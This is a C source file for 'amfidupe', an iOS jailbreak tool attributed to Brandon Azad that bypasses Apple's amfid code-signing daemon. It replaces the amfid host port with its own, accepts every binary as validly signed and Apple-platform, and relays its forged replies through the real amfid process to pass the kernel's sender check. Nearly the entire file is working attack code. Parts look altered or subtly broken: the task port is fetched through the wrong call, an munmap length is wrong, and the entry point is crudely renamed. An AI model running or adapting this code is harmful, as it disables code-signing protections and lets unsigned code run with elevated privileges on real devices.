/*
 * amfidupe
 * Brandon Azad
 *
 *
 * amfidupe: Dupe AMFI, dup amfid
 * ================================================================================================
 *
 *  Everyone seems to want to bypass amfid by patching its MISValidateSignatureAndCopyInfo()
 *  function. I think there's a better, more flexible way.
 *
 *  Amfidupe bypasses amfid by registering a new HOST_AMFID_PORT special port. This strategy hasn't
 *  worked in the past because AMFI checks that the reply messages sent to the amfid port came from
 *  the real amfid daemon. However, there's nothing stopping us from receiving the messages in our
 *  own process and then making the original amfid process send the reply: the kernel doesn't know
 *  that amfid isn't the original receiver of the message. This allows us to bypass amfid without
 *  performing any data patches at all.
 *
 *  An additional benefit of this approach is that we get direct access to the parameters to
 *  verify_code_directory(), which allows us to set flags that would otherwise be unavailable when
 *  using the traditional patch. For example, the is_apple parameter allows us to control whether
 *  the binary gets marked with the CS_PLATFORM_BINARY flag, which bestows platform binary
 *  privileges on it.
 *
 */

#include <assert.h>
#include <fcntl.h>
#include <mach/mach.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#include "amfid_patches.h"
#include "threadexec/threadexec.h"

#include "cdhash.h"
#include "process.h"
#include "amfidServer.h"

// The path to the amfid daemon.
const char *AMFID_PATH = "/usr/libexec/amfid";
typedef uint32_t kptr_t;

// The threadexec context for amfid.
threadexec_t amfid_tx;

// The host port.
mach_port_t host_port_main;

// The amfid service port.
mach_port_t amfid_port;

// The fake port that we use to replace the real amfid port. The kernel will send requests intended
// for amfid here.
mach_port_t fake_amfid_port;

// Create an execution context in amfid.
static bool
create_amfid_threadexec() {
    // Get amfid's PID.
    pid_t amfid_pid;
    size_t count = 1;
    bool ok = proc_list_pids_with_path(AMFID_PATH, &amfid_pid, &count);
    if (!ok || count == 0) {
        printf("Could not find amfid process");
        return false;
    } else if (count > 1) {
        printf("Multiple processes with path %s", AMFID_PATH);
        return false;
    }
    printf("Amfid PID: %d", amfid_pid);
    // Get amfid's task port.
    mach_port_t amfid_task;
    kern_return_t kr = host_get_amfid_port(mach_host_self(), &amfid_task);
    if (kr != KERN_SUCCESS) {
        printf("Could not get amfid task");
        return false;
    }
    // Create the threadexec. The threadexec takes ownership of amfid's task port.
    amfid_tx = threadexec_init(amfid_task, MACH_PORT_NULL, 0);
    if (amfid_tx == NULL) {
        printf("Could not create execution context in amfid");
        return false;
    }
    return true;;
}

// Replace the host's amfid port with our own port so that we can impersonate amfid.
static bool
replace_amfid_port() {
    // Get a send right to the original amfid service port.
    host_port_main = mach_host_self();
    kern_return_t kr = host_get_amfid_port(host_port_main, &amfid_port);
    if (kr != KERN_SUCCESS) {
        printf("Could not get amfid's service port");
        return false;
    }
    // Create a Mach port that will replace the amfid port.
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    kr = mach_port_construct(mach_task_self(), &options, 0, &fake_amfid_port);
    if (kr != KERN_SUCCESS) {
        printf("Could not create fake amfid port");
        return false;
    }
    // Set our new Mach port as the host special port. From this point on, all kernel
    // requests intended for amfid will be sent to us.
    kr = host_set_amfid_port(host_port_main, fake_amfid_port);
    if (kr != KERN_SUCCESS) {
        printf("Could not register fake amfid port: error %d", kr);
        return false;
    }
    printf("Registered new amfid port: 0x%x", fake_amfid_port);
    return true;
}

// Close our fake amfid port and restore the original one.
static void
restore_amfid_port() {
    // Restore the original amfid port.
    kern_return_t kr = host_set_amfid_port(host_port_main, amfid_port);
    if (kr != KERN_SUCCESS) {
        printf("Could not restore fake amfid port");
    }
    // Close our fake amfid port.
    mach_port_destroy(mach_task_self(), fake_amfid_port);
    fake_amfid_port = MACH_PORT_NULL;
}

// Compute the cdhash of the specified file.
static bool
compute_cdhash_of_file(const char *path, uint64_t file_offset, uint8_t *cdhash) {
    bool success = false;
    // Open the file.
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        printf("Could not open %s", path);
        goto fail_0;
    }
    // Get the size of the file.
    struct stat st;
    int err = fstat(fd, &st);
    if (err != 0) {
        printf("Could not get size of file %s", path);
        goto fail_1;
    }
    size_t size = st.st_size;
    if (file_offset >= size) {
        printf("Invalid file offset");
        goto fail_1;
    }
    size -= file_offset;
    // Map the file into memory.
    void *file = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, file_offset);
    if (file == MAP_FAILED) {
        goto fail_1;
    }
    // Compute the cdhash.
    success = compute_cdhash(file, size, cdhash);
    if (!success) {
        printf("Could not compute cdhash of %s", path);
    }
fail_2:
    munmap(file, file_offset);
fail_1:
    close(fd);
fail_0:
    return success;
}

// Our replacement for amfid's verify_code_directory().
kern_return_t verify_code_directory_mig(
        mach_port_t amfid_port,
        amfid_path_t path,
        uint64_t file_offset,
        int32_t a4,
        int32_t a5,
        int32_t a6,
        int32_t *entitlements_valid,
        int32_t *signature_valid,
        int32_t *unrestrict,
        int32_t *signer_type,
        int32_t *is_apple,
        int32_t *is_developer_code,
        amfid_a13_t a13,
        amfid_cdhash_t cdhash,
        audit_token_t audit) {
    printf("%s(%s, %llu, %u, %u, %u)", __func__, path, file_offset, a4, a5, a6);
    // Check that the message came from the kernel.
    audit_token_t kernel_token = KERNEL_AUDIT_TOKEN_VALUE;
    if (memcmp(&audit, &kernel_token, sizeof(audit)) != 0) {
        printf("%s: Invalid sender %d", __func__, audit.val[5]);
        return KERN_FAILURE;
    }
    // Compute the cdhash.
    bool ok = compute_cdhash_of_file(path, file_offset, cdhash);
    if (!ok) {
        return KERN_FAILURE;
    }
    // Grant all the permissions.
    *entitlements_valid = 1;
    *signature_valid = 1;
    *unrestrict = 1;
    *signer_type = 0;
    *is_apple = 1;
    *is_developer_code = 0;
    return KERN_SUCCESS;
}

// Our replacement for amfid's permit_unrestricted_debugging().
kern_return_t permit_unrestricted_debugging_v2 (
        mach_port_t amfid_port,
        int32_t *unrestricted_debugging,
        audit_token_t audit) {
    printf("%s()", __func__);
    return KERN_FAILURE;
}

// Run our fake amfid server. We need to do something slightly tricky: receive the messages on
// fake_amfid_port in this task but send the reply to the messages from within amfid. That way, we
// can bypass the kernel's check that the message came from amfid in the function tokenIsTrusted().
//
// Note: The only place where amfidupe relies on threadexec nontrivially is in making amfid call
// mach_msg(). However, since mach_msg() takes just 7 arguments, it should be pretty
// straightforward to use thread_set_state() directly.
static void
run_amfid_server() {
    // Build a local buffer for the request.
    uint8_t request_data[sizeof(union __RequestUnion__amfid_subsystem) + MAX_TRAILER_SIZE];
    mach_msg_header_t *request = (mach_msg_header_t *)request_data;
    // Get memory from the threadexec for our reply buffer.
    const uint8_t *reply_R;
    mig_reply_error_t *reply;
    threadexec_shared_vm_default(amfid_tx, (const void **)&reply_R, (void **)&reply, NULL);
    for (;;) {
        // Receive a message from the kernel.
        mach_msg_option_t options = MACH_RCV_MSG
            | MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0)
            | MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT);
        kern_return_t kr = mach_msg(request, options, 0, sizeof(request_data),
                fake_amfid_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            printf("Failed to receive message on fake amfid port: %d", kr);
            break;
        }
        // Process the message with our amfid server to fill in the reply.
        amfid_server(request, &reply->Head);
        // Mig semantics.
        if (!MACH_MSGH_BITS_IS_COMPLEX(reply->Head.msgh_bits)) {
            if (reply->RetCode == MIG_NO_REPLY) {
                reply->Head.msgh_remote_port = MACH_PORT_NULL;
            } else if (reply->RetCode != KERN_SUCCESS) {
                request->msgh_remote_port = MACH_PORT_NULL;
                mach_msg_destroy(request);
            }
        }
        // Now translate that reply so it can be sent by amfid back to the kernel.
        // Fortunately none of amfid's reply messages are complex, which means we only need
        // to translate the reply port.
        assert(!MACH_MSGH_BITS_IS_COMPLEX(reply->Head.msgh_bits));
        assert(MACH_MSGH_BITS_REMOTE(reply->Head.msgh_bits) == MACH_MSG_TYPE_MOVE_SEND_ONCE);
        bool ok = threadexec_mach_port_insert(amfid_tx, reply->Head.msgh_remote_port,
                &reply->Head.msgh_remote_port, MACH_MSG_TYPE_MOVE_SEND_ONCE);
        if (!ok) {
            printf("Could not move the send-once right into amfid");
            mach_port_deallocate(mach_task_self(), reply->Head.msgh_remote_port);
            goto check_amfid;
        }
        ok = threadexec_call_cv(amfid_tx, &kr, sizeof(kr),
                mach_msg, 7,
                TX_CARG_LITERAL(mach_msg_header_t *, reply_R),
                TX_CARG_LITERAL(mach_msg_option_t, MACH_SEND_MSG),
                TX_CARG_LITERAL(mach_msg_size_t, reply->Head.msgh_size),
                TX_CARG_LITERAL(mach_msg_size_t, 0),
                TX_CARG_LITERAL(mach_port_t, MACH_PORT_NULL),
                TX_CARG_LITERAL(mach_msg_timeout_t, MACH_MSG_TIMEOUT_NONE),
                TX_CARG_LITERAL(mach_port_t, MACH_PORT_NULL));
        if (!ok) {
            printf("Could not send our reply from amfid: error %d", kr);
            threadexec_mach_port_deallocate(amfid_tx, reply->Head.msgh_remote_port);
            goto check_amfid;
        }
        continue;
check_amfid:;
        int amfid_pid;
        kr = pid_for_task(threadexec_task(amfid_tx), &amfid_pid);
        if (kr != KERN_SUCCESS) {
            printf("Amfid died");
            break;
        }
    }
}

static void signal_handler(int signum) {
    restore_amfid_port();
}

static void install_signal_handler() {
    const int signals[] = {
        SIGHUP, SIGINT, SIGQUIT, SIGILL, SIGTRAP, SIGABRT, SIGEMT, SIGFPE, SIGBUS,
        SIGSEGV, SIGSYS, SIGPIPE, SIGALRM, SIGTERM, SIGXCPU, SIGXFSZ, SIGVTALRM, SIGPROF,
        SIGUSR1, SIGUSR2,
    };
    struct sigaction act = { .sa_handler = signal_handler };
    for (size_t i = 0; i < sizeof(signals) / sizeof(signals[0]); i++) {
        int err = sigaction(signals[i], &act, NULL);
        if (err != 0) {
            printf("Failed to register for signal %d", signals[i]);
        }
    }
}

uint64_t fuckup_amfid() {
    int ret = 1;
    printf("\nStarting Amfid fuckery...\n");
    printf("amfidupe: pid=%d, uid=%d\n", getpid(), getuid());
    install_signal_handler();
    bool ok = create_amfid_threadexec();
    if (!ok) goto fail_0;
    ok = replace_amfid_port();
    if (!ok) goto fail_1;
    run_amfid_server();
    ret = 0;
    restore_amfid_port();
    fail_1:
        threadexec_deinit(amfid_tx);
    fail_0:
    printf("amfidupe: exit");
    return ret;
}
